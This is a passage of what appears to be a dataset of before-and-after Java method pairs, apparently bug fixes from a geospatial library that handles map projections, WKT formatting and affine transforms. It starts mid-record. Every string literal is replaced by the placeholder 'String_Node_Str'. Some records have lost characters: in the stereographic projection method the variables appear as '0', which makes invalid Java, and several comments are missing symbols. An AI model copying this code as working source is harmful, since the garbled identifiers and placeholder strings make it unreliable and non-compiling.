    throw new ParameterNotFoundException(Errors.format(Errors.Keys.AmbiguousName_3,IdentifiedObjects.toString(values.descriptor(fallback).getName()),IdentifiedObjects.toString(values.descriptor(ambiguity).getName()),name),name);
  }
  return null;
}"
91985,"/** 
 * Returns a hash value for this parameter.
 * @return The hash code value. This value doesn't need to be the samein past or future versions of this class.
 */
@Override public int hashCode(){
  return values.descriptor.hashCode() ^ values.hashCode();
}","/** 
 * Returns a hash value for this parameter.
 * @return The hash code value. This value does not need to be the samein past or future versions of this class.
 */
@Override public int hashCode(){
  return values.descriptor.hashCode() ^ values.hashCode();
}"
91986,"/** 
 * Creates a new subgroup of the specified name, and adds it to the list of subgroups. The argument shall be the name of a   {@linkplain DefaultParameterDescriptorGroup descriptor group}which is a child of this group. <div class=""note""><b>API note:</b> There is no   {@code removeGroup(String)} method. To remove a group, users shall inspect the{@link #values()} list, decide which occurrences to remove if there is many of them for thesame name, and whether to iterate recursively into sub-groups or not.</div>
 * @param name The name of the parameter group to create.
 * @return A newly created parameter group for the given name.
 * @throws ParameterNotFoundException If no descriptor was found for the given name.
 * @throws InvalidParameterCardinalityException If this parameter group already contains the{@linkplain ParameterDescriptorGroup#getMaximumOccurs() maximum number of occurrences}of subgroups of the given name.
 */
@Override public ParameterValueGroup addGroup(final String name) throws ParameterNotFoundException, InvalidParameterCardinalityException {
  final ParameterValueList values=this.values;
  final ParameterDescriptorGroup descriptor=values.descriptor;
  final GeneralParameterDescriptor child=descriptor.descriptor(name);
  if (!(child instanceof ParameterDescriptorGroup)) {
    throw new ParameterNotFoundException(Errors.format(Errors.Keys.ParameterNotFound_2,descriptor.getName(),name),name);
  }
  final ParameterValueGroup value=((ParameterDescriptorGroup)child).createValue();
  values.add(value);
  return value;
}","/** 
 * Creates a new subgroup of the specified name, and adds it to the list of subgroups. The argument shall be the name of a   {@linkplain DefaultParameterDescriptorGroup descriptor group}which is a child of this group. <div class=""note""><b>API note:</b> There is no   {@code removeGroup(String)} method. To remove a group, users shall inspect the{@link #values()} list, decide which occurrences to remove if there is many of them for thesame name, and whether to iterate recursively into sub-groups or not.</div>
 * @param name The name of the parameter group to create.
 * @return A newly created parameter group for the given name.
 * @throws ParameterNotFoundException if no descriptor was found for the given name.
 * @throws InvalidParameterCardinalityException if this parameter group already contains the{@linkplain ParameterDescriptorGroup#getMaximumOccurs() maximum number of occurrences}of subgroups of the given name.
 */
@Override public ParameterValueGroup addGroup(final String name) throws ParameterNotFoundException, InvalidParameterCardinalityException {
  final ParameterValueList values=this.values;
  final ParameterDescriptorGroup descriptor=values.descriptor;
  final GeneralParameterDescriptor child=descriptor.descriptor(name);
  if (!(child instanceof ParameterDescriptorGroup)) {
    throw new ParameterNotFoundException(Errors.format(Errors.Keys.ParameterNotFound_2,descriptor.getName(),name),name);
  }
  final ParameterValueGroup value=((ParameterDescriptorGroup)child).createValue();
  values.add(value);
  return value;
}"
91987,"/** 
 * Copies the values of a parameter group into another parameter group. All values in the   {@code source} group shall be valid for the {@code destination} group,but the  {@code destination} may have more parameters.Sub-groups are copied recursively. <p>A typical usage of this method is for transferring values from an arbitrary implementation to some specific implementation, or to a parameter group using a different but compatible {@linkplain DefaultParameterValueGroup#getDescriptor() descriptor}.</p>
 * @param values The parameters values to copy.
 * @param destination Where to copy the values.
 * @throws InvalidParameterNameException if a {@code source} parameter name is unknown to the {@code destination}.
 * @throws InvalidParameterValueException if the value of a {@code source} parameter is invalid for the {@code destination}.
 * @see #clone()
 * @since 0.5
 */
public static void copy(final ParameterValueGroup values,final ParameterValueGroup destination) throws InvalidParameterNameException, InvalidParameterValueException {
  final Integer ZERO=0;
  final Map<String,Integer> occurrences=new HashMap<>();
  for (  final GeneralParameterValue value : values.values()) {
    final String name=value.getDescriptor().getName().getCode();
    final int occurrence=occurrences.getOrDefault(name,ZERO);
    if (value instanceof ParameterValueGroup) {
      final List<ParameterValueGroup> groups=destination.groups(name);
      copy((ParameterValueGroup)value,(occurrence < groups.size()) ? groups.get(occurrence) : destination.addGroup(name));
    }
 else {
      final ParameterValue<?> source=(ParameterValue<?>)value;
      final ParameterValue<?> target;
      if (occurrence == 0) {
        try {
          target=destination.parameter(name);
        }
 catch (        ParameterNotFoundException cause) {
          throw new InvalidParameterNameException(Errors.format(Errors.Keys.UnexpectedParameter_1,name),cause,name);
        }
      }
 else {
        target=(ParameterValue<?>)getOrCreate(destination,name,occurrence);
      }
      final Object v=source.getValue();
      final Unit<?> unit=source.getUnit();
      if (unit == null) {
        target.setValue(v);
      }
 else       if (v instanceof Number) {
        target.setValue(((Number)v).doubleValue(),unit);
      }
 else       if (v instanceof double[]) {
        target.setValue((double[])v,unit);
      }
 else {
        throw new InvalidParameterValueException(Errors.format(Errors.Keys.IllegalArgumentValue_2,name,v),name,v);
      }
    }
    occurrences.put(name,occurrence + 1);
  }
}","/** 
 * Copies the values of a parameter group into another parameter group. All values in the   {@code source} group shall be valid for the {@code destination} group,but the  {@code destination} may have more parameters.Sub-groups are copied recursively. <p>A typical usage of this method is for transferring values from an arbitrary implementation to some specific implementation, or to a parameter group using a different but compatible {@linkplain DefaultParameterValueGroup#getDescriptor() descriptor}.</p>
 * @param values The parameters values to copy.
 * @param destination Where to copy the values.
 * @throws InvalidParameterNameException if a {@code source} parameter name is unknown to the {@code destination}.
 * @throws InvalidParameterValueException if the value of a {@code source} parameter is invalid for the {@code destination}.
 * @see #clone()
 * @since 0.5
 */
public static void copy(final ParameterValueGroup values,final ParameterValueGroup destination) throws InvalidParameterNameException, InvalidParameterValueException {
  final Integer ZERO=0;
  final Map<String,Integer> occurrences=new HashMap<>();
  for (  final GeneralParameterValue value : values.values()) {
    final String name=value.getDescriptor().getName().getCode();
    final int occurrence=occurrences.getOrDefault(name,ZERO);
    if (value instanceof ParameterValueGroup) {
      final List<ParameterValueGroup> groups=destination.groups(name);
      copy((ParameterValueGroup)value,(occurrence < groups.size()) ? groups.get(occurrence) : destination.addGroup(name));
    }
 else {
      final ParameterValue<?> source=(ParameterValue<?>)value;
      final ParameterValue<?> target;
      if (occurrence == 0) {
        try {
          target=destination.parameter(name);
        }
 catch (        ParameterNotFoundException cause) {
          throw new InvalidParameterNameException(Errors.format(Errors.Keys.UnexpectedParameter_1,name),cause,name);
        }
      }
 else {
        target=(ParameterValue<?>)getOrCreate(destination,name,occurrence);
      }
      final Object v=source.getValue();
      final Unit<?> unit=source.getUnit();
      if (unit == null) {
        target.setValue(v);
      }
 else       if (v instanceof Number) {
        target.setValue(((Number)v).doubleValue(),unit);
      }
 else       if (v instanceof double[]) {
        target.setValue((double[])v,unit);
      }
 else       if (v != target.getValue()) {
        throw new InvalidParameterValueException(Errors.format(Errors.Keys.IllegalArgumentValue_2,name,v),name,v);
      }
    }
    occurrences.put(name,occurrence + 1);
  }
}"
91988,"/** 
 * Returns the parameter of the given name, or   {@code null} if it does not exist.The default implementation iterates over the  {@link #values()} and compares the descriptor names.The  {@link DefaultParameterValueGroup} subclass will override this method with a more efficientimplementation which avoid creating some deferred parameters.
 */
ParameterValue<?> parameterIfExist(final String name) throws ParameterNotFoundException {
  for (  final GeneralParameterValue value : values()) {
    if (value instanceof ParameterValue<?>) {
      if (isHeuristicMatchForName(value.getDescriptor(),name)) {
        return (ParameterValue<?>)value;
      }
    }
  }
  return null;
}","/** 
 * Returns the parameter of the given name, or   {@code null} if it does not exist.The default implementation iterates over the  {@link #values()} and compares the descriptor names.The  {@link DefaultParameterValueGroup} subclass will override this method with a more efficientimplementation which avoid creating some deferred parameters.
 */
@SuppressWarnings(""String_Node_Str"") ParameterValue<?> parameterIfExist(final String name) throws ParameterNotFoundException {
  ParameterValue<?> fallback=null;
  ParameterValue<?> ambiguity=null;
  for (  final GeneralParameterValue value : values()) {
    if (value instanceof ParameterValue<?>) {
      final ParameterValue<?> param=(ParameterValue<?>)value;
      final ParameterDescriptor<?> descriptor=param.getDescriptor();
      if (name.equals(descriptor.getName().toString())) {
        return param;
      }
      if (isHeuristicMatchForName(descriptor,name)) {
        if (fallback == null) {
          fallback=param;
        }
 else {
          ambiguity=param;
        }
      }
    }
  }
  if (ambiguity != null) {
    throw new ParameterNotFoundException(Errors.format(Errors.Keys.AmbiguousName_3,IdentifiedObjects.toString(fallback.getDescriptor().getName()),IdentifiedObjects.toString(ambiguity.getDescriptor().getName()),name),name);
  }
  return fallback;
}"
91989,"/** 
 * Returns a modifiable copy of this parameter.
 */
@Override public DefaultParameterValue<T> clone(){
  return new DefaultParameterValue<>(this);
}","/** 
 * Returns a modifiable copy of this parameter.
 */
@Override @SuppressWarnings(""String_Node_Str"") public DefaultParameterValue<T> clone(){
  return new DefaultParameterValue<>(this);
}"
91990,"/** 
 * Formats the inner part of a <cite>Well Known Text</cite> version 1 (WKT 1) element. If this inverse math transform has any parameter values, then this method formats the WKT as in the   {@linkplain AbstractMathTransform#formatWKT super-class method}. Otherwise this method formats the math transform as an   {@code ""Inverse_MT""} entity.<div class=""note""><b>Compatibility note:</b> {@code Param_MT} and {@code Inverse_MT} are defined in the WKT 1 specification only.</div>
 * @param formatter The formatter to use.
 * @return The WKT element name, which is {@code ""Param_MT""} or{@code ""Inverse_MT""} in the default implementation.
 */
@Override protected String formatTo(final Formatter formatter){
  final ParameterValueGroup parameters=getParameterValues();
  if (parameters != null) {
    WKTUtilities.appendParamMT(parameters,formatter);
    return WKTKeywords.Param_MT;
  }
 else {
    formatter.append((FormattableObject)AbstractMathTransform.this);
    return WKTKeywords.Inverse_MT;
  }
}","/** 
 * Formats the inner part of a <cite>Well Known Text</cite> version 1 (WKT 1) element. If this inverse math transform has any parameter values, then this method formats the WKT as in the   {@linkplain AbstractMathTransform#formatWKT super-class method}. Otherwise this method formats the math transform as an   {@code ""Inverse_MT""} entity.<div class=""note""><b>Compatibility note:</b> {@code Param_MT} and {@code Inverse_MT} are defined in the WKT 1 specification only.</div>
 * @param formatter The formatter to use.
 * @return The WKT element name, which is {@code ""Param_MT""} or{@code ""Inverse_MT""} in the default implementation.
 */
@Override protected String formatTo(final Formatter formatter){
  final ParameterValueGroup parameters=getParameterValues();
  if (parameters != null) {
    WKTUtilities.appendParamMT(parameters,formatter);
    return WKTKeywords.Param_MT;
  }
 else {
    formatter.newLine();
    formatter.append((FormattableObject)AbstractMathTransform.this);
    return WKTKeywords.Inverse_MT;
  }
}"
91991,"/** 
 * Formats a <cite>Well Known Text</cite> version 1 (WKT 1) element for a transform using this group of parameters. <div class=""note""><b>Compatibility note:</b>  {@code Param_MT} is defined in the WKT 1 specification only.If the  {@linkplain Formatter#getConvention() formatter convention} is set to WKT 2,then this method silently uses the WKT 1 convention without raising an error.</div>
 * @return {@code ""Param_MT""}.
 */
@Override protected String formatTo(final Formatter formatter){
  if (inverse) {
    formatter.append(new WKT(false));
    return WKTKeywords.Inverse_MT;
  }
 else {
    WKTUtilities.appendParamMT(ContextualParameters.this,formatter);
    return WKTKeywords.Param_MT;
  }
}","/** 
 * Formats a <cite>Well Known Text</cite> version 1 (WKT 1) element for a transform using this group of parameters. <div class=""note""><b>Compatibility note:</b>  {@code Param_MT} is defined in the WKT 1 specification only.If the  {@linkplain Formatter#getConvention() formatter convention} is set to WKT 2,then this method silently uses the WKT 1 convention without raising an error.</div>
 * @return {@code ""Param_MT""}.
 */
@Override protected String formatTo(final Formatter formatter){
  if (inverse) {
    formatter.newLine();
    formatter.append(new WKT(false));
    return WKTKeywords.Inverse_MT;
  }
 else {
    WKTUtilities.appendParamMT(ContextualParameters.this,formatter);
    return WKTKeywords.Param_MT;
  }
}"
91992,"/** 
 * Given a transformation chain, replaces the elements around   {@code transforms.get(index)} transform byalternative objects to use when formatting WKT. The replacement is performed in-place in the given list. <p>This method shall replace only the previous element and the few next elements that need to be changed as a result of the previous change. This method is not expected to continue the iteration after the changes that are of direct concern to this object.</p> <p>This method is invoked (indirectly) only by  {@link ConcatenatedTransform#getPseudoSteps()} in orderto get the  {@link ParameterValueGroup} of a map projection, or to format a {@code ProjectedCRS} WKT.</p>
 * @param transforms The full chain of concatenated transforms.
 * @param index      The index of this transform in the {@code transforms} chain.
 * @param inverse    Always {@code false}, except if we are formatting the inverse transform.
 * @return Index of this transform in the {@code transforms} chain after processing.
 * @see ConcatenatedTransform#getPseudoSteps()
 * @see AbstractMathTransform#beforeFormat(List,int,boolean)
 */
final int beforeFormat(final List<Object> transforms,int index,final boolean inverse){
  Matrix before=null;
  Matrix after=null;
  if (index != 0) {
    final Object candidate=transforms.get(index - 1);
    if (candidate instanceof MathTransform) {
      before=MathTransforms.getMatrix((MathTransform)candidate);
    }
  }
  if (index + 1 < transforms.size()) {
    final Object candidate=transforms.get(index + 1);
    if (candidate instanceof MathTransform) {
      after=MathTransforms.getMatrix((MathTransform)candidate);
    }
  }
  final boolean hasBefore=(before != null);
  final boolean hasAfter=(after != null);
  MatrixSIS userDefined;
  try {
    userDefined=getMatrix(inverse ? MatrixRole.DENORMALIZATION : MatrixRole.INVERSE_NORMALIZATION);
  }
 catch (  IllegalStateException e) {
    unexpectedException(e);
    return index;
  }
  if (hasBefore) {
    userDefined=userDefined.multiply(before);
  }
  before=Matrices.isIdentity(userDefined,Formulas.ANGULAR_TOLERANCE) ? null : userDefined;
  if (!inverse)   try {
    userDefined=getMatrix(inverse ? MatrixRole.NORMALIZATION : MatrixRole.INVERSE_DENORMALIZATION);
  }
 catch (  IllegalStateException e) {
    unexpectedException(e);
    return index;
  }
  if (hasAfter) {
    userDefined=Matrices.multiply(after,userDefined);
  }
  after=Matrices.isIdentity(userDefined,Formulas.ANGULAR_TOLERANCE) ? null : userDefined;
  if (before == null) {
    if (hasBefore) {
      final Object old=transforms.remove(--index);
      assert(old instanceof LinearTransform);
    }
  }
 else {
    if (hasBefore) {
      final Object old=transforms.set(index - 1,before);
      assert(old instanceof LinearTransform);
    }
 else {
      transforms.add(index++,before);
    }
  }
  transforms.set(index,new WKT(inverse));
  if (after == null) {
    if (hasAfter) {
      final Object old=transforms.remove(index + 1);
      assert(old instanceof LinearTransform);
    }
  }
 else {
    if (hasAfter) {
      final Object old=transforms.set(index + 1,after);
      assert(old instanceof LinearTransform);
    }
 else {
      transforms.add(index + 1,after);
    }
  }
  return index;
}","/** 
 * Given a transformation chain, replaces the elements around   {@code transforms.get(index)} transform byalternative objects to use when formatting WKT. The replacement is performed in-place in the given list. <p>This method shall replace only the previous element and the few next elements that need to be changed as a result of the previous change. This method is not expected to continue the iteration after the changes that are of direct concern to this object.</p> <p>This method is invoked (indirectly) only by  {@link ConcatenatedTransform#getPseudoSteps()} in orderto get the  {@link ParameterValueGroup} of a map projection, or to format a {@code ProjectedCRS} WKT.</p>
 * @param transforms The full chain of concatenated transforms.
 * @param index      The index of this transform in the {@code transforms} chain.
 * @param inverse    Always {@code false}, except if we are formatting the inverse transform.
 * @return Index of this transform in the {@code transforms} chain after processing.
 * @see ConcatenatedTransform#getPseudoSteps()
 * @see AbstractMathTransform#beforeFormat(List,int,boolean)
 */
final int beforeFormat(final List<Object> transforms,int index,final boolean inverse){
  Matrix before=null;
  Matrix after=null;
  if (index != 0) {
    final Object candidate=transforms.get(index - 1);
    if (candidate instanceof MathTransform) {
      before=MathTransforms.getMatrix((MathTransform)candidate);
    }
  }
  if (index + 1 < transforms.size()) {
    final Object candidate=transforms.get(index + 1);
    if (candidate instanceof MathTransform) {
      after=MathTransforms.getMatrix((MathTransform)candidate);
    }
  }
  final boolean hasBefore=(before != null);
  final boolean hasAfter=(after != null);
  MatrixSIS userDefined;
  try {
    userDefined=getMatrix(inverse ? MatrixRole.DENORMALIZATION : MatrixRole.INVERSE_NORMALIZATION);
  }
 catch (  IllegalStateException e) {
    unexpectedException(e);
    return index;
  }
  if (hasBefore) {
    userDefined=userDefined.multiply(before);
  }
  before=Matrices.isIdentity(userDefined,Formulas.ANGULAR_TOLERANCE) ? null : userDefined;
  try {
    userDefined=getMatrix(inverse ? MatrixRole.NORMALIZATION : MatrixRole.INVERSE_DENORMALIZATION);
  }
 catch (  IllegalStateException e) {
    unexpectedException(e);
    return index;
  }
  if (hasAfter) {
    userDefined=Matrices.multiply(after,userDefined);
  }
  after=Matrices.isIdentity(userDefined,Formulas.ANGULAR_TOLERANCE) ? null : userDefined;
  if (before == null) {
    if (hasBefore) {
      final Object old=transforms.remove(--index);
      assert(old instanceof LinearTransform);
    }
  }
 else {
    if (hasBefore) {
      final Object old=transforms.set(index - 1,before);
      assert(old instanceof LinearTransform);
    }
 else {
      transforms.add(index++,before);
    }
  }
  transforms.set(index,new WKT(inverse));
  if (after == null) {
    if (hasAfter) {
      final Object old=transforms.remove(index + 1);
      assert(old instanceof LinearTransform);
    }
  }
 else {
    if (hasAfter) {
      final Object old=transforms.set(index + 1,after);
      assert(old instanceof LinearTransform);
    }
 else {
      transforms.add(index + 1,after);
    }
  }
  return index;
}"
91993,"/** 
 * Tests the WKT formatting of   {@link NormalizedProjection}. For the Mercator projection, we expect only the ellipsoid eccentricity. We expect nothing else because all other parameters are used by the (de)normalization affine transforms instead than the   {@link Mercator} class itself.
 * @see LambertConicConformalTest#testNormalizedWKT()
 */
@Test public void testNormalizedWKT(){
  createNormalizedProjection(true);
  assertWktEquals(""String_Node_Str"" + ""String_Node_Str"");
}","/** 
 * Tests the WKT formatting of   {@link NormalizedProjection}. For the Mercator projection, we expect only the ellipsoid eccentricity. We expect nothing else because all other parameters are used by the (de)normalization affine transforms instead than the   {@link Mercator} class itself.
 * @throws NoninvertibleTransformException should never happen.
 * @see LambertConicConformalTest#testNormalizedWKT()
 */
@Test public void testNormalizedWKT() throws NoninvertibleTransformException {
  createNormalizedProjection(true);
  assertWktEquals(""String_Node_Str"" + ""String_Node_Str"");
  transform=transform.inverse();
  assertWktEquals(""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str"");
}"
91994,"/** 
 * Returns the sequence of <cite>normalization</cite>    {@code this}  <cite>denormalization</cite> transformsas a whole. The transform returned by this method expects (<var>longitude</var>, <var>latitude</var>) coordinates in <em>degrees</em> and returns (<var>x</var>,<var>y</var>) coordinates in <em>metres</em>. <p>The non-linear part of the returned transform will be  {@code this} transform, except if the ellipsoidis spherical. In the later case,  {@code this} transform will be replaced by a simplified implementation.</p>
 * @param factory The factory to use for creating the transform.
 * @return The map projection from (,) to (<var>x</var>,<var>y</var>) coordinates.
 * @throws FactoryException if an error occurred while creating a transform.
 */
@Override public MathTransform createMapProjection(final MathTransformFactory factory) throws FactoryException {
  if (Double.isNaN(0)) {
    final Double 0=context.getValue(LATITUDE_OF_ORIGIN);
    if (0 != null && abs(0 - 90) < Formulas.ANGULAR_TOLERANCE) {
      return delegate(factory,PolarStereographicA.NAME);
    }
  }
  ObliqueStereographic kernel=this;
  if (excentricity == 0) {
    kernel=new Spherical(this);
  }
  return context.completeTransform(factory,kernel);
}","/** 
 * Returns the sequence of <cite>normalization</cite>    {@code this}  <cite>denormalization</cite> transformsas a whole. The transform returned by this method expects (<var>longitude</var>, <var>latitude</var>) coordinates in <em>degrees</em> and returns (<var>x</var>,<var>y</var>) coordinates in <em>metres</em>. <p>The non-linear part of the returned transform will be  {@code this} transform, except if the ellipsoidis spherical. In the later case,  {@code this} transform will be replaced by a simplified implementation.</p>
 * @param factory The factory to use for creating the transform.
 * @return The map projection from (,) to (<var>x</var>,<var>y</var>) coordinates.
 * @throws FactoryException if an error occurred while creating a transform.
 */
@Override public MathTransform createMapProjection(final MathTransformFactory factory) throws FactoryException {
  if (Double.isNaN(0)) {
    final Double 0=context.getValue(LATITUDE_OF_ORIGIN);
    if (0 != null && abs(abs(0) - 90) < Formulas.ANGULAR_TOLERANCE) {
      return delegate(factory,PolarStereographicA.NAME);
    }
  }
  ObliqueStereographic kernel=this;
  if (excentricity == 0) {
    kernel=new Spherical(this);
  }
  return context.completeTransform(factory,kernel);
}"
91995,"/** 
 * Returns a unique instance of the given range.
 */
static <E extends Number & Comparable<? super E>,T extends NumberRange<E>>T unique(final T range){
  return POOL.unique(range);
}","/** 
 * Returns a unique instance of the given range, except if the range is empty. <div class=""note""><b>Rational:</b> we exclude empty ranges because the   {@link Range#equals(Object)} consider them as equal.Consequently if empty ranges were included in the pool, this method would return in some occasions an empty range with different values than the given  {@code range} argument.</div>
 */
static <E extends Number & Comparable<? super E>,T extends NumberRange<E>>T unique(T range){
  if (!range.isEmpty()) {
    range=POOL.unique(range);
  }
  return range;
}"
91996,"/** 
 * Compares this range with the given object for equality.
 * @param object The object to compare with this range for equality.
 * @return {@code true} if the given object is equal to this range.
 */
@Override public boolean equals(final Object object){
  if (object == this) {
    return true;
  }
  if (object != null && object.getClass() == getClass()) {
    final Range<?> other=(Range<?>)object;
    if (Objects.equals(elementType,other.elementType)) {
      if (isEmpty()) {
        return other.isEmpty();
      }
      return Objects.equals(minValue,other.minValue) && Objects.equals(maxValue,other.maxValue) && isMinIncluded == other.isMinIncluded && isMaxIncluded == other.isMaxIncluded;
    }
  }
  return false;
}","/** 
 * Compares this range with the given object for equality. Two ranges are considered equal if they have the same   {@link #getElementType() element type} and:<ul> <li>are both  {@linkplain #isEmpty() empty}, or</li> <li>have equal   {@linkplain #getMinValue() minimum} and {@linkplain #getMaxValue() maximum} valueswith equal inclusive/exclusive flags.</li> </ul> Note that subclasses may add other requirements, for example on units of measurement.
 * @param object The object to compare with this range for equality.
 * @return {@code true} if the given object is equal to this range.
 */
@Override public boolean equals(final Object object){
  if (object == this) {
    return true;
  }
  if (object != null && object.getClass() == getClass()) {
    final Range<?> other=(Range<?>)object;
    if (Objects.equals(elementType,other.elementType)) {
      if (isEmpty()) {
        return other.isEmpty();
      }
      return Objects.equals(minValue,other.minValue) && Objects.equals(maxValue,other.maxValue) && isMinIncluded == other.isMinIncluded && isMaxIncluded == other.isMaxIncluded;
    }
  }
  return false;
}"
91997,"/** 
 * Returns a copy of the matrix that user can modify.
 */
@Override public final Matrix clone(){
  return Matrices.copy(this);
}","/** 
 * Returns a copy of the matrix that user can modify.
 */
@Override @SuppressWarnings(""String_Node_Str"") public final Matrix clone(){
  return Matrices.copy(this);
}"
91998,"/** 
 * Creates the inverse transform of this object.
 * @throws NoninvertibleTransformException if this transform can not be inverted.
 */
@Override public final MathTransform2D inverse() throws NoninvertibleTransformException {
  if (inverse == null) {
    if (super.isIdentity()) {
      inverse=this;
    }
 else synchronized (this) {
      if (inverse == null)       try {
        final AffineTransform2D work=new AffineTransform2D(this,true);
        work.invert();
        work.forcePositiveZeros();
        work.freeze();
        work.inverse=this;
        inverse=work;
      }
 catch (      java.awt.geom.NoninvertibleTransformException exception) {
        throw new NoninvertibleTransformException(exception.getLocalizedMessage(),exception);
      }
    }
  }
  return inverse;
}","/** 
 * Creates the inverse transform of this object.
 * @throws NoninvertibleTransformException if this transform can not be inverted.
 */
@Override public final MathTransform2D inverse() throws NoninvertibleTransformException {
  if (inverse == null) {
    if (super.isIdentity()) {
      inverse=this;
    }
 else synchronized (this) {
      if (inverse == null) {
        final AffineTransform2D work=new AffineTransform2D(((ExtendedPrecisionMatrix)Matrices.inverse(matrix)).getExtendedElements());
        work.inverse=this;
        inverse=work;
      }
    }
  }
  return inverse;
}"
91999,"/** 
 * Returns a new affine transform which is a modifiable copy of this transform. This implementation always returns an instance of   {@link AffineTransform}, <strong>not</strong>   {@code AffineTransform2D}, because the later is unmodifiable and cloning it make little sense.
 * @return A modifiable copy of this affine transform.
 */
@Override public AffineTransform clone(){
  return new AffineTransform(this);
}","/** 
 * Returns a new affine transform which is a modifiable copy of this transform. This implementation always returns an instance of   {@link AffineTransform}, <strong>not</strong>   {@code AffineTransform2D}, because the later is unmodifiable and cloning it make little sense.
 * @return A modifiable copy of this affine transform.
 */
@Override @SuppressWarnings(""String_Node_Str"") public AffineTransform clone(){
  return new AffineTransform(this);
}"
92000,"/** 
 * Constructs a new   {@code AffineTransform2D} from 6 values representing the 6 specifiableentries of the 33 transformation matrix. Those values are given unchanged to the {@link AffineTransform#AffineTransform(double,double,double,double,double,double) superclass constructor}.
 * @param m00 the X coordinate scaling.
 * @param m10 the Y coordinate shearing.
 * @param m01 the X coordinate shearing.
 * @param m11 the Y coordinate scaling.
 * @param m02 the X coordinate translation.
 * @param m12 the Y coordinate translation.
 */
public AffineTransform2D(double m00,double m10,double m01,double m11,double m02,double m12){
  super(pz(m00),pz(m10),pz(m01),pz(m11),pz(m02),pz(m12));
  freeze();
}","/** 
 * Constructs a new   {@code AffineTransform2D} from 6 values representing the 6 specifiableentries of the 33 transformation matrix. Those values are given unchanged to the {@link AffineTransform#AffineTransform(double,double,double,double,double,double) superclass constructor}.
 * @param m00 the X coordinate scaling.
 * @param m10 the Y coordinate shearing.
 * @param m01 the X coordinate shearing.
 * @param m11 the Y coordinate scaling.
 * @param m02 the X coordinate translation.
 * @param m12 the Y coordinate translation.
 */
public AffineTransform2D(double m00,double m10,double m01,double m11,double m02,double m12){
  super(pz(m00),pz(m10),pz(m01),pz(m11),pz(m02),pz(m12));
  matrix=new AffineMatrix(this,null);
}"
